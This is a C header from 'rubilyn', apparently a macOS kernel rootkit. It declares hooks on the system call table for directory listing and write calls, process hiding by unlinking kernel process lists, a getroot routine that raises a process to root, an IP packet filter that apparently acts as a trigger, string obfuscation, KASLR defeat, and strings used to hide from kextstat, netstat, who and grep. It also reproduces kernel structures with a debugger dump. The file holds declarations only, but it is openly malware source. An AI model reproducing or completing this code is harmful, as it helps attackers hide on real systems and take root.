/*
 
  internals.h
  rubilyn
 
*/

#ifndef rubilyn_internals_h
#define rubilyn_internals_h

/* includes */
#include <mach/mach_types.h>
#include <libkern/libkern.h>
#include <sys/appleapiopts.h>
#include <sys/cdefs.h>
#include <sys/systm.h>
#include <sys/attr.h>
#include <sys/dirent.h>
#include <sys/sysctl.h>
#include <sys/queue.h>
#include <mach-o/loader.h>
#include <sys/kpi_mbuf.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <netinet/kpi_ipfilter.h>
#include "/Applications/Xcode.app//Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.7.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/sys/syscall.h"

/* PAD() Macros */
#define PAD_(t) (sizeof(uint64_t) <= sizeof(t) ? 0 : sizeof(uint64_t) - sizeof(t))
#if BYTE_ORDER == LITTLE_ENDIAN
#define PADL_(t) 0
#define PADR_(t) PAD_(t)
#else
#define PADL_(t) PAD_(t)
#define PADR_(t) 0
#endif

/* kernel internals API definitions */
typedef kauth_cred_t (*kauth_cred_setuidgidp)(kauth_cred_t, int, int);
typedef int (*lck_mtx_lockp) (lck_mtx_t*);
typedef int (*lck_mtx_unlockp) (lck_mtx_t*);
typedef int (*KUNCExecutep) (char *, int, int);
typedef void (*proc_list_lockp)(void);
typedef void (*proc_list_unlockp)(void);

/* kernel internal symbols */
uint64_t* nsysent; 
lck_mtx_lockp my_lck_mtx_lock;  
kauth_cred_setuidgidp my_kauth_cred_setuidgid; 
lck_mtx_unlockp my_lck_mtx_unlock; 
KUNCExecutep my_KUNCExecute;
proc_list_lockp my_proc_list_lock;
proc_list_unlockp my_proc_list_unlock;

/* kext internal globals */
char* linkeditstr;
char* sysctl;
char* rubilyn;
char* kextstat;
char* netstat;
char* w;
char* who;
char* grep;
char* icmpstr;

/* DKOM structures */
struct proclist {
    struct proc* lh_first;
};
struct proclist* my_allproc;

/* pointers to orig syscall */
int (*org_getdirentriesattr) (struct proc *p, void *uap, register_t *retval);
int (*org_getdirentries64) (struct proc *p,void *uap, user_ssize_t *retval);
int (*org_write_nocancel) (struct proc* p,void *uap, user_ssize_t *retval);

/* getdirent & friends structures */
struct getdirentries64_args {
    char fd_l_[PADL_(int)]; int fd; char fd_r_[PADR_(int)];
    char buf_l_[PADL_(user_addr_t)]; user_addr_t buf; char buf_r_[PADR_(user_addr_t)];
    char bufsize_l_[PADL_(user_size_t)]; user_size_t bufsize; char bufsize_r_[PADR_(user_size_t)];
    char position_l_[PADL_(user_addr_t)]; user_addr_t position; char position_r_[PADR_(user_addr_t)];
};

struct getdirentriesattr_args {
    char fd_l_[PADL_(int)]; int fd; char fd_r_[PADR_(int)];
    char alist_l_[PADL_(user_addr_t)]; user_addr_t alist; char alist_r_[PADR_(user_addr_t)];
    char buffer_l_[PADL_(user_addr_t)]; user_addr_t buffer; char buffer_r_[PADR_(user_addr_t)];
    char buffersize_l_[PADL_(user_size_t)]; user_size_t buffersize; char buffersize_r_[PADR_(user_size_t)];
    char count_l_[PADL_(user_addr_t)]; user_addr_t count; char count_r_[PADR_(user_addr_t)];
    char basep_l_[PADL_(user_addr_t)]; user_addr_t basep; char basep_r_[PADR_(user_addr_t)];
    char newstate_l_[PADL_(user_addr_t)]; user_addr_t newstate; char newstate_r_[PADR_(user_addr_t)];
    char options_l_[PADL_(user_ulong_t)]; user_ulong_t options; char options_r_[PADR_(user_ulong_t)];
};

/* write_nocancel struct */
struct write_nocancel_args {
    char fd_l_[PADL_(int)]; int fd; char fd_r_[PADR_(int)];
    char cbuf_l_[PADL_(user_addr_t)]; user_addr_t cbuf; char cbuf_r_[PADR_(user_addr_t)];
    char nbyte_l_[PADL_(user_size_t)]; user_size_t nbyte; char nbyte_r_[PADR_(user_size_t)];
};

/* prototypes */
static struct sysent* find_sysent();
static int getroot(int pid);
register_t new_getdirentries64(struct proc *p, struct getdirentries64_args *uap, user_ssize_t *retval);
register_t new_getdirentriesattr(struct proc *p, struct getdirentriesattr_args *uap, register_t *retval);
static void ipf_detach(void* cookie);
static errno_t ipf_input(void* cookie, mbuf_t *data, int offset, u_int8_t protocol);
static errno_t ipf_output(void* cookie, mbuf_t *data, ipf_pktopts_t options);
static int hideproc(int pid);
static int unhideproc(int pid);
uint64_t find_symbol(char* symbolname);
char* string_hide(char* string,int len,char* key);
int new_write_nocancel(struct proc* p, struct write_nocancel_args *uap, user_ssize_t * retval);
char *my_strstr(char *s, char *find);
kern_return_t rubilyn_start(kmod_info_t * ki, void *d);
kern_return_t rubilyn_stop(kmod_info_t *ki, void *d);
int string_handler();
uint64_t smashASLR();


/* string table index */
struct nlist_64 {
    union {
        uint32_t  n_strx; /* index into the string table */
    } n_un;
    uint8_t n_type;        /* type flag, see below */
    uint8_t n_sect;        /* section number or NO_SECT */
    uint16_t n_desc;       /* see <mach-o/stab.h> */
    uint64_t n_value;      /* value of this symbol (or stab offset) */
};

/* syscall hooking defs */
typedef int32_t sy_call_t (struct proc *, void *, int *);
typedef int32_t (*sys_call_t)();typedef void sy_munge_t (const void *, void *);

/* system call table definition */
struct sysent {         
    int16_t         sy_narg;         /* number of args */
    int8_t          sy_resv;         /* reserved  */
    int8_t          sy_flags;        /* flags */
    sy_call_t       *sy_call;        /* implementing function */
    sy_munge_t      *sy_arg_munge32; /* system call arguments munger for 32-bit process */
    sy_munge_t      *sy_arg_munge64; /* system call arguments munger for 64-bit process */
    int32_t         sy_return_type;  /* system call return types */
    uint16_t        sy_arg_bytes;    /* Total size of arguments in bytes */
};

/* xnu-xxx/osfmk/UserNotification/KUNCUserNotifications.h */
#define kOpenApplicationPath    0
#define kOpenPreferencePanel    1
#define kOpenApplication        2
#define kOpenAppAsRoot          0
#define kOpenAppAsConsoleUser   1

/* osfmk/i386/locks.h */
struct lck_spin_t {
	unsigned long    opaque[10];
};

struct lck_mtx_t {
	union {
		struct {
			volatile uintptr_t		lck_mtxd_owner;
			union {
				struct {
					volatile uint32_t
                lck_mtxd_waiters:16,
                lck_mtxd_pri:8,
                lck_mtxd_ilocked:1,
                lck_mtxd_mlocked:1,
                lck_mtxd_promoted:1,
                lck_mtxd_spin:1,
                lck_mtxd_is_ext:1,
                lck_mtxd_pad3:3;
				};
                uint32_t	lck_mtxd_state;
			};
			uint32_t			lck_mtxd_pad32;
		} lck_mtxd;
		struct {
			struct _lck_mtx_ext_		*lck_mtxi_ptr;
			uint32_t			lck_mtxi_tag;
			uint32_t			lck_mtxi_pad32;
		} lck_mtxi;
	} lck_mtx_sw;
};

/* xnu/bsd/sys/proc_internal.h */

/*
 * Description of a process.
 *
 * This structure contains the information needed to manage a thread of
 * control, known in UN*X as a process; it has references to substructures
 * containing descriptions of things that the process uses, but may share
 * with related processes.  The process structure and the substructures
 * are always addressible except for those marked "(PROC ONLY)" below,
 * which might be addressible only on a processor on which the process
 * is running.
 */

/* aren't we pretty for a real life suicide. */

/*$2 = {p_list = {le_next = 0xffffff80073b4300, le_prev = 0xffffff80073b4b80}, 
    p_pid = 163, task = 0xffffff80081038b8, p_pptr = 0xffffff8006d1acc0, 
    p_ppid = 154, p_pgrpid = 163, p_uid = 501, p_gid = 20, p_ruid = 501, 
    p_rgid = 20, p_svuid = 501, p_svgid = 20, p_uniqueid = 163, p_mlock = {
        opaque = {0, 18446744069414584320}}, p_stat = 2 '\002', 
    p_shutdownstate = 0 '\0', p_kdebug = 0 '\0', p_btrace = 0 '\0', p_pglist = {
        le_next = 0x0, le_prev = 0xffffff80066ac0f0}, p_sibling = {
            le_next = 0xffffff80073b4300, le_prev = 0xffffff80073b4bf8}, p_children = {
                lh_first = 0xffffff80090e3a80}, p_uthlist = {
                    tqh_first = 0xffffff8007ef1420, tqh_last = 0xffffff80090eba10}, p_hash = {
                        le_next = 0x0, le_prev = 0xffffff8006344120}, p_evlist = {tqh_first = 0x0, 
                            tqh_last = 0xffffff80073b25f0}, p_fdmlock = {opaque = {0, 
                                18446744069414584320}}, p_ucred = 0xffffff80063e9170, 
    p_fd = 0xffffff8006647d10, p_stats = 0xffffff80073f9970, 
    p_limit = 0xffffff80008d9400, p_sigacts = 0xffffff80073fc490, p_siglist = 0, 
    p_slock = {opaque = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0}}, p_olimit = 0x0, 
    p_flag = 16516, p_lflag = 8388608, p_listflag = 196608, p_ladvflag = 0, 
    p_refcount = 0, p_childrencnt = 4, p_parentref = 0, p_oppid = 0, 
    p_xstat = 0, p_realtimer = {it_interval = {tv_sec = 0, tv_usec = 0}, 
        it_value = {tv_sec = 0, tv_usec = 0}}, p_rtime = {tv_sec = 0, 
            tv_usec = 0}, p_vtimer_user = {it_interval = {tv_sec = 0, tv_usec = 0}, 
                it_value = {tv_sec = 0, tv_usec = 0}}, p_vtimer_prof = {it_interval = {
                    tv_sec = 0, tv_usec = 0}, it_value = {tv_sec = 0, tv_usec = 0}}, 
    p_rlim_cpu = {tv_sec = 0, tv_usec = 0}, p_debugger = 0, sigwait = 0, 
    sigwait_thread = 0x0, exit_thread = 0x0, p_vforkcnt = 0, p_vforkact = 0x0, 
    p_fpdrainwait = 0, p_contproc = 163, si_pid = 0, si_status = 0, si_code = 0, 
    si_uid = 0, vm_shm = 0x0, p_dtrace_argv = 140734881307856, 
    p_dtrace_envp = 140734881307880, p_dtrace_sprlock = {opaque = {0, 
        18446744069414584320}}, p_dtrace_probes = 0, p_dtrace_count = 0, 
    p_dtrace_stop = 0 '\0', p_dtrace_ptss_pages = 0x0, 
    p_dtrace_ptss_free_list = 0x0, p_dtrace_helpers = 0x0, 
    p_dtrace_lazy_dofs = 0xffffff8008ad9800, p_argslen = 656, p_argc = 2, 
    user_stack = 140734881308672, p_textvp = 0xffffff8008feb458, 
    p_textoff = 4096, p_sigmask = 0, p_sigignore = 406880256, 
    p_sigcatch = 524288, p_priority = 24 '\030', p_resv0 = 0 '\0', 
    p_nice = 0 '\0', p_resv1 = 0 '\0', p_mac_enforce = 128, 
    p_comm = "Terminal\000sk\000\000\000\000\000", 
    p_name = '\0' <repeats 32 times>, p_pgrp = 0xffffff80066ac0e0, 
    p_csflags = 1, p_pcaction = 2, p_uuid = "4?\"2?R2Ę??U??py", 
    p_aio_total_count = 0, p_aio_active_count = 0, p_aio_activeq = {
        tqh_first = 0x0, tqh_last = 0xffffff80073b2868}, p_aio_doneq = {
            tqh_first = 0x0, tqh_last = 0xffffff80073b2878}, p_klist = {
                slh_first = 0xffffff800822b008}, p_ru = 0x0, p_sigwaitcnt = 0, 
    p_signalholder = 0x0, p_transholder = 0x0, p_acflag = 0, p_lctx = 0x0, 
    p_lclist = {le_next = 0x0, le_prev = 0x0}, p_threadstart = 140735640230760, 
    p_wqthread = 140735640230776, p_pthsize = 8192, 
    p_targconc = 140735213105216, p_wqptr = 0xffffff8035fe7000, p_wqsize = 8632, 
    p_wqiniting = 0, p_wqlock = {opaque = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0}}, 
    p_start = {tv_sec = 1343305033, tv_usec = 282745}, 
    p_rcall = 0xffffff800759c770, p_ractive = 0, p_idversion = 163, 
    p_pthhash = 0xffffff8006d84408, p_dispatchqueue_offset = 160}
*/
struct	proc {
	LIST_ENTRY(proc) p_list;		/* List of all processes. */
	pid_t		p_pid;			/* Process identifier. (static)*/
	void * 		task;			/* corresponding task (static)*/
	struct	proc *	p_pptr;		 	/* Pointer to parent process.(LL) */
	pid_t		p_ppid;			/* process's parent pid number */
	pid_t		p_pgrpid;		/* process group id of the process (LL)*/
	uid_t		p_uid;
	gid_t		p_gid;
	uid_t		p_ruid;
	gid_t		p_rgid;
	uid_t		p_svuid;
	gid_t		p_svgid;
	uint64_t	p_uniqueid;		/* process uniqe ID */
	struct lck_mtx_t p_mlock;		/* mutex lock for proc */
	char		p_stat;			/* S* process status. (PL)*/
	char		p_shutdownstate;
	char		p_kdebug;		/* P_KDEBUG eq (CC)*/ 
	char		p_btrace;		/* P_BTRACE eq (CC)*/
	LIST_ENTRY(proc) p_pglist;		/* List of processes in pgrp.(PGL) */
	LIST_ENTRY(proc) p_sibling;		/* List of sibling processes. (LL)*/
	LIST_HEAD(, proc) p_children;		/* Pointer to list of children. (LL)*/
	TAILQ_HEAD( , uthread) p_uthlist; 	/* List of uthreads  (PL) */
    
	LIST_ENTRY(proc) p_hash;		/* Hash chain. (LL)*/
	TAILQ_HEAD( ,eventqelt) p_evlist;	/* (PL) */
    
	struct lck_mtx_t	p_fdmlock;		/* proc lock to protect fdesc */
    
	/* substructures: */
	kauth_cred_t	p_ucred;		/* Process owner's identity. (PL) */             // SEEM OK TO HERE
	struct	filedesc *p_fd;			/* Ptr to open files structure. (PFDL) */
	struct	pstats *p_stats;		/* Accounting/statistics (PL). */
	struct	plimit *p_limit;		/* Process limits.(PL) */
    
	struct	sigacts *p_sigacts;		/* Signal actions, state (PL) */
    int		p_siglist;		/* signals captured back from threads */
	struct lck_spin_t	p_slock;		/* spin lock for itimer/profil protection */
    
#define	p_rlimit	p_limit->pl_rlimit
    
	struct	plimit *p_olimit;		/* old process limits  - not inherited by child  (PL) */
	unsigned int	p_flag;			/* P_* flags. (atomic bit ops) */
	unsigned int	p_lflag;		/* local flags  (PL) */
	unsigned int	p_listflag;		/* list flags (LL) */
	unsigned int	p_ladvflag;		/* local adv flags (atomic) */
	int		p_refcount;		/* number of outstanding users(LL) */
	int		p_childrencnt;		/* children holding ref on parent (LL) */
	int		p_parentref;		/* children lookup ref on parent (LL) */
    
	pid_t		p_oppid;	 	/* Save parent pid during ptrace. XXX */
	u_int		p_xstat;		/* Exit status for wait; also stop signal. */
    
//#ifdef _PROC_HAS_SCHEDINFO_
//	/* may need cleanup, not used */
//	u_int		p_estcpu;	 	/* Time averaged value of p_cpticks.(used by aio and proc_comapre) */
//	fixpt_t		p_pctcpu;	 	/* %cpu for this process during p_swtime (used by aio)*/
//	u_int		p_slptime;		/* used by proc_compare */
//#endif /* _PROC_HAS_SCHEDINFO_ */
    
	struct	itimerval p_realtimer;		/* Alarm timer. (PSL) */
	struct	timeval p_rtime;		/* Real time.(PSL)  */
	struct	itimerval p_vtimer_user;	/* Virtual timers.(PSL)  */
	struct	itimerval p_vtimer_prof;	/* (PSL) */
    
	struct	timeval	p_rlim_cpu;		/* Remaining rlim cpu value.(PSL) */
	int		p_debugger;		/*  NU 1: can exec set-bit programs if suser */
	boolean_t	sigwait;	/* indication to suspend (PL) */
	void	*sigwait_thread;	/* 'thread' holding sigwait(PL)  */
	void	*exit_thread;		/* Which thread is exiting(PL)  */
	int	p_vforkcnt;		/* number of outstanding vforks(PL)  */
    void *  p_vforkact;     	/* activation running this vfork proc)(static)  */
	int	p_fpdrainwait;		/* (PFDL) */
	pid_t	p_contproc;	/* last PID to send us a SIGCONT (PL) */
    
	/* Following fields are info from SIGCHLD (PL) */
	pid_t	si_pid;			/* (PL) */
	u_int   si_status;		/* (PL) */
	u_int	si_code;		/* (PL) */
	uid_t	si_uid;			/* (PL) */
    
	void * vm_shm;			/* (SYSV SHM Lock) for sysV shared memory */
    
//#if CONFIG_DTRACE
	user_addr_t			p_dtrace_argv;			/* (write once, read only after that) */
	user_addr_t			p_dtrace_envp;			/* (write once, read only after that) */
	struct lck_mtx_t			p_dtrace_sprlock;		/* sun proc lock emulation */
	int				p_dtrace_probes;		/* (PL) are there probes for this proc? */
	u_int				p_dtrace_count;			/* (sprlock) number of DTrace tracepoints */
    uint8_t                         p_dtrace_stop;                  /* indicates a DTrace-desired stop */
	struct dtrace_ptss_page*	p_dtrace_ptss_pages;		/* (sprlock) list of user ptss pages */
	struct dtrace_ptss_page_entry*	p_dtrace_ptss_free_list;	/* (atomic) list of individual ptss entries */
	struct dtrace_helpers*		p_dtrace_helpers;		/* (dtrace_lock) DTrace per-proc private */
	struct dof_ioctl_data*		p_dtrace_lazy_dofs;		/* (sprlock) unloaded dof_helper_t's */
//#endif /* CONFIG_DTRACE */
    
    /* XXXXXXXXXXXXX BCOPY'ed on fork XXXXXXXXXXXXXXXX */
    /* The following fields are all copied upon creation in fork. */
#define	p_startcopy	p_argslen
    
	u_int	p_argslen;	 /* Length of process arguments. */
	int  	p_argc;			/* saved argc for sysctl_procargs() */
	user_addr_t user_stack;		/* where user stack was allocated */
	struct	vnode *p_textvp;	/* Vnode of executable. */
	off_t	p_textoff;		/* offset in executable vnode */
    
	sigset_t p_sigmask;		/* DEPRECATED */
	sigset_t p_sigignore;	/* Signals being ignored. (PL) */
	sigset_t p_sigcatch;	/* Signals being caught by user.(PL)  */
    
	u_char	p_priority;	/* (NU) Process priority. */
	u_char	p_resv0;	/* (NU) User-priority based on p_cpu and p_nice. */
	char	p_nice;		/* Process "nice" value.(PL) */
	u_char	p_resv1;	/* (NU) User-priority based on p_cpu and p_nice. */
    
//#if CONFIG_MACF
	int	p_mac_enforce;			/* MAC policy enforcement control */
//#endif
    
	char	p_comm[MAXCOMLEN+1];
	char	p_name[(2*MAXCOMLEN)+1];	/* PL */
    
	struct 	pgrp *p_pgrp;	/* Pointer to process group. (LL) */
#if CONFIG_EMBEDDED
	int		p_iopol_disk;	/* disk I/O policy (PL) */
#endif /* CONFIG_EMBEDDED */
	uint32_t	p_csflags;	/* flags for codesign (PL) */
	uint32_t	p_pcaction;	/* action  for process control on starvation */
	uint8_t p_uuid[16];		/* from LC_UUID load command */
    
    /* End area that is copied on creation. */
    /* XXXXXXXXXXXXX End of BCOPY'ed on fork (AIOLOCK)XXXXXXXXXXXXXXXX */
#define	p_endcopy	p_aio_total_count
	int		p_aio_total_count;		/* all allocated AIO requests for this proc */
	int		p_aio_active_count;		/* all unfinished AIO requests for this proc */
	TAILQ_HEAD( , aio_workq_entry ) p_aio_activeq; 	/* active async IO requests */
	TAILQ_HEAD( , aio_workq_entry ) p_aio_doneq;	/* completed async IO requests */
    
	//struct klist p_klist;  /* knote list (PL ?)*/
    
	struct	rusage *p_ru;	/* Exit information. (PL) */
	int		p_sigwaitcnt;
	thread_t 	p_signalholder;
	thread_t 	p_transholder;
    
	/* DEPRECATE following field  */
	u_short	p_acflag;	/* Accounting flags. */
    
	struct lctx *p_lctx;		/* Pointer to login context. */
	LIST_ENTRY(proc) p_lclist;	/* List of processes in lctx. */
	user_addr_t 	p_threadstart;		/* pthread start fn */
	user_addr_t 	p_wqthread;		/* pthread workqueue fn */
	int 	p_pthsize;			/* pthread size */
	user_addr_t	p_targconc;		/* target concurrency ptr */
	void * 	p_wqptr;			/* workq ptr */
	int 	p_wqsize;			/* allocated size */
	boolean_t       p_wqiniting;            /* semaphore to serialze wq_open */
	struct lck_spin_t*	p_wqlock;		/* lock to protect work queue */
	struct  timeval p_start;        	/* starting time */
	void *	p_rcall;
	int		p_ractive;
	int	p_idversion;		/* version of process identity */
	void *	p_pthhash;			/* pthread waitqueue hash */
#if DIAGNOSTIC
	unsigned int p_fdlock_pc[4];
	unsigned int p_fdunlock_pc[4];
#if SIGNAL_DEBUG
	unsigned int lockpc[8];
	unsigned int unlockpc[8];
#endif /* SIGNAL_DEBUG */
#endif /* DIAGNOSTIC */
	uint64_t	p_dispatchqueue_offset;
};

#endif
